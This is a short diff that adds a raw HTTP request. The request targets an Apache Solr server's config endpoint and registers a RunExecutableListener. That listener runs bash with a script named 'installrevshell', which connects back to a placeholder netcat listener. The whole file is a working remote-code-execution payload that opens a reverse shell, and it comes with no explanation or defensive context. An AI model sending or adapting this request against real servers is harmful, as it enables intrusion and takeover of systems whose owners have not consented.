@@ -1,0 +1,15 @@
+POST /solr/NAME_OF_COLLECTION/config HTTP/1.1
+Host: IP_OF_SOLR_SERVER:8983
+Content-Type: application/json
+Content-Length: 205
+
+{
+  "update-listener" : {
+    "event":"postCommit",
+    "name":"newlistener",
+    "class":"solr.RunExecutableListener",
+    "exe":"bash",
+    "dir":"/bin/",
+    "args":["-e","/tmp/installrevshell","IP_OF_NETCAT_LISTENER","PORT_OF_NETCAT_LISTENER"]
+  }
+}
